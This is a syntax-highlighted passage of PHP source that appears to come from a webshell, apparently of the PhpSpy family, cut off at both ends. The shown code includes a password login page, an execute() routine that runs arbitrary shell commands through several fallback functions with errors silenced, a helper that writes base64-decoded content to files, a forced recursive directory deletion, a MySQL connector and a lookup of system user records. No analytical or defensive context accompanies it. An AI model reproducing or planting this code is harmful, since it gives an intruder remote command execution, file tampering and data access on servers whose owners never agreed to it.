<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $from = 1;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if(($to - $from) &lt; $page &amp;&amp; ($to - $from) &lt; $pages) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $to = $page;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } elseif($to &gt; $pages) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $from = $curpage - $pages + $to;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $to = $pages;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if(($to - $from) &lt; $page &amp;&amp; ($to - $from) &lt; $pages) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $from = $pages - $page + 1;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $multipage = ($curpage - $offset &gt; 1 &amp;&amp; $pages &gt; $page ? '&lt;a href="javas<span style="text-decoration: underline;">cript:settable(\''.$tablename.'\', \'\', 1);"&gt;First&lt;/a&gt; ' : '').($curpage &gt; 1 ? '&lt;a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage - 1).');"&gt;Prev&lt;/a&gt; ' : '');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   for($i = $from; $i &lt;= $to; $i++) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $multipage .= $i == $curpage ? $i.' ' : '&lt;a href="javascript:settabl<span style="text-decoration: underline;">e(\''.$tablename.'\', \'\', '.$i.');"&gt;['.$i.']&lt;/a&gt; ';</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $multipage .= ($curpage &lt; $pages ? '&lt;a href="javascript:settable(\''.$ta<span style="text-decoration: underline;">blename.'\', \'\', '.($curpage + 1).');"&gt;Next&lt;/a&gt;' : '').($to &lt; $pages ? ' &lt;a href="javascript:settable(\''.$tablename.'\', \'\', '.$pages.');"&gt;Last&lt;/a&gt;' : '');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $multipage = $multipage ? '&lt;p&gt;Pages: '.$multipage.'&lt;/p&gt;' : '';
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   return $multipage;
}
// &#30331;&#38470;&#20837;&#21475;
function loginpage() {
?&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;style type="text/css"&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #b5bd68;">input </span>{<span style="color: #f0c674;">font:</span>11px Verdana;<span style="color: #f0c674;">BACKGROUND:</span> <span style="color: #000000; background-color: #FFFFFF;">#FFFFFF</span>;<span style="color: #f0c674;">height:</span> 18px;<span style="color: #f0c674;">border:</span> 1px solid <span style="color: #ffffff; background-color: #666666; text-decoration: underline;">#666666</span><span style="text-decoration: underline;">;}</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;/style&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;form method="POST" action=""&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;span style="font:11px Verdana;"&gt;Password: &lt;/span&gt;&lt;input name="password" typ<span style="text-decoration: underline;">e="password" size="20"&gt;</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;input type="hidden" name="action" value="login"&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;input type="submit" value="Login"&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;/form&gt;
&lt;?php
<span style="color: #969896; background-color: #1d1f21;"> </span>   exit;
}//end loginpage()

function execute($cfe) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   $res = '';
<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($cfe) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if(function_exists('system')) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @ob_start();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @system($cfe);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $res = @ob_get_contents();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @ob_end_clean();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } elseif(function_exists('passthru')) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @ob_start();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @passthru($cfe);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $res = @ob_get_contents();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @ob_end_clean();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } elseif(function_exists('shell_exec')) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $res = @shell_exec($cfe);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } elseif(function_exists('exec')) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @exec($cfe,$res);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $res = join("\n",$res);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } elseif(@is_resource($f = @popen($cfe,"r"))) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $res = '';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   while(!@feof($f)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $res .= @fread($f,1024);<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @pclose($f);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   return $res;
}
function which($pr) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   $path = execute("which $pr");
<span style="color: #969896; background-color: #1d1f21;"> </span>   return ($path ? $path : $pr);<span style="color: #de935f; background-color: #373b41;"> </span>
}

function cf($fname,$text){
<span style="color: #969896; background-color: #1d1f21;"> </span>   if($fp=@fopen($fname,'w')) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @fputs($fp,@base64_decode($text));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @fclose($fp);
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
}
function dirsize($dir) {<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   $dh = @opendir($dir);
<span style="color: #969896; background-color: #1d1f21;"> </span>   $size = 0;
<span style="color: #969896; background-color: #1d1f21;"> </span>   while($file = @readdir($dh)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($file != '.' &amp;&amp; $file != '..') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $path = $dir.'/'.$file;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $size += @is_dir($path) ? dirsize($path) : @filesize($path);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   @closedir($dh);
<span style="color: #969896; background-color: #1d1f21;"> </span>   return $size;
}
// &#39029;&#38754;&#35843;&#35797;&#20449;&#24687;
function debuginfo() {
<span style="color: #969896; background-color: #1d1f21;"> </span>   global $starttime;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $mtime = explode(' ', microtime());
<span style="color: #969896; background-color: #1d1f21;"> </span>   $totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
<span style="color: #969896; background-color: #1d1f21;"> </span>   echo 'Processed in '.$totaltime.' second(s)';
}

//&#36830;&#25509;MYSQL&#25968;&#25454;&#24211;
function mydbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306')<span style="text-decoration: underline;"> {</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   global $charsetdb;
<span style="color: #969896; background-color: #1d1f21;"> </span>   @ini_set('mysql.connect_timeout', 5);
<span style="color: #969896; background-color: #1d1f21;"> </span>   if(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;h2&gt;Can not connect to MySQL server&lt;/h2&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   exit;
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   if($link &amp;&amp; $dbname) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (!@mysql_select_db($dbname, $link)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;h2&gt;Database selected has error&lt;/h2&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   exit;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   if($link &amp;&amp; mysql_get_server_info() &gt; '4.1') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if($charset &amp;&amp; in_array(strtolower($charset), $charsetdb)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   q("SET character_set_connection=$charset, character_set_results=$cha<span style="text-decoration: underline;">rset, character_set_client=binary;", $link);</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   return $link;
}

// &#21435;&#25481;&#36716;&#20041;&#23383;&#31526;
function s_array(&amp;$array) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   if (is_array($array)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach ($array as $k =&gt; $v) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $array[$k] = s_array($v);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   } else if (is_string($array)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $array = stripslashes($array);
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   return $array;
}

// &#28165;&#38500;HTML&#20195;&#30721;
function html_clean($content) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   $content = htmlspecialchars($content);
<span style="color: #969896; background-color: #1d1f21;"> </span>   $content = str_replace("\n", "&lt;br /&gt;", $content);
<span style="color: #969896; background-color: #1d1f21;"> </span>   $content = str_replace("  ", "&amp;nbsp;&amp;nbsp;", $content);
<span style="color: #969896; background-color: #1d1f21;"> </span>   $content = str_replace("\t", "&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;", $content);
<span style="color: #969896; background-color: #1d1f21;"> </span>   return $content;
}

// &#33719;&#21462;&#26435;&#38480;
function getChmod($filepath){
<span style="color: #969896; background-color: #1d1f21;"> </span>   return substr(base_convert(@fileperms($filepath),10,8),-4);
}

function getPerms($filepath) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   $mode = @fileperms($filepath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   if (($mode &amp; 0xC000) === 0xC000) {$type = 's';}
<span style="color: #969896; background-color: #1d1f21;"> </span>   elseif (($mode &amp; 0x4000) === 0x4000) {$type = 'd';}
<span style="color: #969896; background-color: #1d1f21;"> </span>   elseif (($mode &amp; 0xA000) === 0xA000) {$type = 'l';}
<span style="color: #969896; background-color: #1d1f21;"> </span>   elseif (($mode &amp; 0x8000) === 0x8000) {$type = '-';}<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   elseif (($mode &amp; 0x6000) === 0x6000) {$type = 'b';}
<span style="color: #969896; background-color: #1d1f21;"> </span>   elseif (($mode &amp; 0x2000) === 0x2000) {$type = 'c';}
<span style="color: #969896; background-color: #1d1f21;"> </span>   elseif (($mode &amp; 0x1000) === 0x1000) {$type = 'p';}
<span style="color: #969896; background-color: #1d1f21;"> </span>   else {$type = '?';}

<span style="color: #969896; background-color: #1d1f21;"> </span>   $owner['read'] = ($mode &amp; 00400) ? 'r' : '-';<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   $owner['write'] = ($mode &amp; 00200) ? 'w' : '-';<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   $owner['execute'] = ($mode &amp; 00100) ? 'x' : '-';<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   $group['read'] = ($mode &amp; 00040) ? 'r' : '-';<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   $group['write'] = ($mode &amp; 00020) ? 'w' : '-';<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   $group['execute'] = ($mode &amp; 00010) ? 'x' : '-';<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   $world['read'] = ($mode &amp; 00004) ? 'r' : '-';<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   $world['write'] = ($mode &amp; 00002) ? 'w' : '-';<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   $world['execute'] = ($mode &amp; 00001) ? 'x' : '-';<span style="color: #de935f; background-color: #373b41;"> </span>

<span style="color: #969896; background-color: #1d1f21;"> </span>   if( $mode &amp; 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S<span style="text-decoration: underline;">';}</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   if( $mode &amp; 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S<span style="text-decoration: underline;">';}</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   if( $mode &amp; 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T<span style="text-decoration: underline;">';}</span>

<span style="color: #969896; background-color: #1d1f21;"> </span>   return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read']<span style="text-decoration: underline;">.$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];</span>
}

function getUser($filepath)     {
<span style="color: #969896; background-color: #1d1f21;"> </span>   if (function_exists('posix_getpwuid')) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $array = @posix_getpwuid(@fileowner($filepath));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($array &amp;&amp; is_array($array)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   return ' / &lt;a href="#" title="User: '.$array['name'].'&amp;#13&amp;#10Passwd<span style="text-decoration: underline;">: '.$array['passwd'].'&amp;#13&amp;#10Uid: '.$array['uid'].'&amp;#13&amp;#10gid: '.$array['gid'].'&amp;#13&amp;#10Gecos: '.$array['gecos'].'&amp;#13&amp;#10Dir: '.$array['dir'].'&amp;#13&amp;#10Shell: '.$array['shell'].'"&gt;'.$array['name'].'&lt;/a&gt;';</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   return '';
}

// &#21024;&#38500;&#30446;&#24405;
function deltree($deldir) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   $mydir=@dir($deldir);<span style="color: #de935f; background-color: #373b41;">   </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   while($file=$mydir-&gt;read())     {<span style="color: #de935f; background-color: #373b41;">       </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if((is_dir($deldir.'/'.$file)) &amp;&amp; ($file!='.') &amp;&amp; ($file!='..')) {<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @chmod($deldir.'/'.$file,0777);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   deltree($deldir.'/'.$file);<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (is_file($deldir.'/'.$file)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @chmod($deldir.'/'.$file,0777);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @unlink($deldir.'/'.$file);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   $mydir-&gt;close();<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   @chmod($deldir,0777);
<span style="color: #969896; background-color: #1d1f21;"> </span>   return @rmdir($deldir) ? 1 : 0;
}

// &#34920;&#26684;&#34892;&#38388;&#30340;&#32972;&#26223;&#33394;&#26367;&#25442;
function bg() {
<span style="color: #969896; background-color: #1d1f21;"> </span>   global $bgc;
<span style="color: #969896; background-color: #1d1f21;"> </span>   return ($bgc++%2==0) ? 'alt1' : 'alt2';
}

// &#33719;&#21462;&#24403;&#21069;&#30340;&#25991;&#20214;&#31995;&#32479;&#36335;&#24452;
function getPath($scriptpath, $nowpath) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($nowpath == '.') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $nowpath = $scriptpath;
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   $nowpath = str_replace('\\', '/', $nowpath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   $nowpath = str_replace('//', '/', $nowpath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   if (substr($nowpath, -1) != '/') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $nowpath = $nowpath.'/';
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   return $nowpath;
}

// &#33719;&#21462;&#24403;&#21069;&#30446;&#24405;&#30340;&#19978;&#32423;&#30446;&#24405;
function getUpPath($nowpath) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   $pathdb = explode('/', $nowpath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   $num = count($pathdb);
<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($num &gt; 2) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   unset($pathdb[$num-1],$pathdb[$num-2]);
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   $uppath = implode('/', $pathdb).'/';
<span style="color: #969896; background-color: #1d1f21;"> </span>   $uppath = str_replace('//', '/', $uppath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   return $uppath;
}

// &#26816;&#26597;PHP&#37197;&#32622;&#21442;&#25968;
function getcfg($varname) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   $result = get_cfg_var($varname);
<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($result == 0) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   return 'No';
<span style="color: #969896; background-color: #1d1f21;"> </span>   } elseif ($result == 1) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   return 'Yes';
<span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   return $result;
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
}

// &#26816;&#26597;&#20989;&#25968;&#24773;&#20917;
function getfun($funName) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   return (false !== function_exists($funName)) ? 'Yes' : 'No';
}

// &#33719;&#24471;&#25991;&#20214;&#25193;&#23637;&#21517;
function getext($file) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   $info = pathinfo($file);
<span style="color: #969896; background-color: #1d1f21;"> </span>   return $info['extension'];
}

function GetWDirList($dir){
<span style="color: #969896; background-color: #1d1f21;"> </span>   global $dirdata,$j,$nowpath;
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$j &amp;&amp; $j=1;
<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($dh = opendir($dir)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   while ($file = readdir($dh)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $f=str_replace('//','/',$dir.'/'.$file);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if($file!='.' &amp;&amp; $file!='..' &amp;&amp; is_dir($f)){
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (is_writable($f)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dirdata[$j]['filename']=str_replace($nowpath,'',$f);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dirdata[$j]['dirchmod']=getChmod($f);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dirdata[$j]['dirperm']=getPerms($f);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dirdata[$j]['dirlink']=$dir;
